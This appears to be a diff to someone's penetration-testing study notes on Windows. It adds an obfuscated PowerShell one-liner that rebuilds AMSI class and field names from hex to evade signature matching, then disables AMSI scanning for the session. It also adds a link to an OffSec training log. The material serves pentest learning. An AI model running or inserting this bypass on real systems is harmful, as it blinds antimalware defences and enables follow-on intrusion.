@@ -72,6 +72,10 @@ One bypass for this:
 
 Note that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.
 
+```powershell
+[REF].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+```
+
 Be aware that AMSI bypasses are *per session*, not global!
 
 ### Manipulating Services
@@ -101,3 +105,4 @@ powershell -c "$COMMAND"
 * [TryHackMe: MAL: Researching](tryhackme-mal-researching.md)
 * [2022-08-24 - OffSec Live: PEN-200 & AWS Deep Dive](../log/2022-08-24-offsec-live-pen-200-and-aws-deep-dive.md)
 * [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
+* [2022-08-26 - OffSec Live: PEN-200](../log/2022-08-26-offsec-live-pen-200.md)
